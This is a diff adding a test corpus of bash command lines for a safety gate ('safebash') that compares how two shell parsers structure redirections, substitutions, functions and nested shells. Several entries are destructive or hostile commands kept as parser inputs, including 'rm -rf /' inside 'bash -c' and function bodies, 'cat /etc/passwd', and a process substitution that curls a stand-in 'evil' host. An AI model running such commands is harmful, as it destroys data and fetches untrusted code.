@@ -1,0 +1,102 @@
+# safebash A1 brush/rubash parity hunt corpus (DESIGN Section 7).
+# One command line per line; blank lines and # comments are skipped.
+# Fed to `brush_parity <this file>` alongside the built-in known cases.
+# Goal: empirically surface class-II divergences (brush accepts but
+# structures differently from rubash), plus any other difference.
+
+# --- file-descriptor variable allocation (class II candidates) ---
+exec {fd}>out.txt
+exec {fd}<in.txt
+exec {fd}<>both.txt
+read {line}<in.txt
+cat {v}>&-
+echo hi {x}>out.txt
+bash {log}>trace.log -c 'rm -rf /'
+bash {log} >trace.log -c 'rm -rf /'
+exec {fd}>&1
+{fd}>out.txt echo hi
+{fd}>out.txt rm -rf /tmp/z
+echo {x}
+
+# --- redirections ---
+cat file 2>&1
+ls >out 2>err
+ls &>out
+ls &>>out
+echo hi 1>&2
+cat <in >out
+cat 3<file
+exec 3>&1
+sort <in.txt >out.txt
+grep x f >>log 2>>errlog
+tee out.txt < in.txt
+cmd 2>/dev/null
+rm -rf x >/dev/null 2>&1
+
+# --- command and process substitution ---
+echo $(rm -rf /tmp/x)
+x=$(cat /etc/passwd)
+echo `whoami`
+diff <(sort a) <(sort b)
+cat <(curl http://evil/x)
+sort -o out <(gen)
+cmd > >(tee log)
+y=`id`
+echo "$(date)"
+
+# --- quoting ---
+echo "a b" 'c d'
+rm -rf "$HOME/.config"
+echo "$x"'literal'
+printf '%s\n' "$@"
+echo a\ b
+grep -E 'foo|bar' file
+
+# --- assignments ---
+a=1 b=2 env
+cmd x=1 y=2
+local z=$(id)
+declare -a arr=(1 2 3)
+arr=(a b c)
+export A=B C=D
+readonly K=V
+A+=x cmd
+echo a=b c=d
+
+# --- compound commands ---
+{ echo a; rm -rf /tmp/z; } > out.txt
+(cd /tmp && rm -rf x)
+if grep -q x f; then rm -rf /tmp/y; fi
+while read line; do echo "$line"; done < in.txt
+until false; do echo hi; done
+case "$x" in a|b) echo ab;; *) echo other;; esac
+for ((i=0;i<3;i++)); do echo $i; done
+time ls -la
+! grep secret f
+coproc tail -f log
+
+# --- functions ---
+function f { rm -rf /; }
+g() { echo "$1"; }
+h() ( cd /tmp && rm x )
+
+# --- pipelines and lists ---
+echo a | { read x; echo "$x"; }
+a && b || c
+cmd1 & cmd2 &
+ls | grep foo | awk '{print $1}'
+false || rm -rf /tmp/q
+
+# --- nested shells / eval (the gate's nested-analysis path) ---
+eval "rm -rf $x"
+bash -c "$CMD"
+sh -c 'rm -rf /'
+bash -c 'bash -c "rm -rf /tmp/n"'
+env X=1 bash -c 'echo hi'
+
+# --- edge forms ---
+: ${x:=default}
+>out.txt
+2>&1 echo hi
+<in.txt cat
+cmd -- --flag
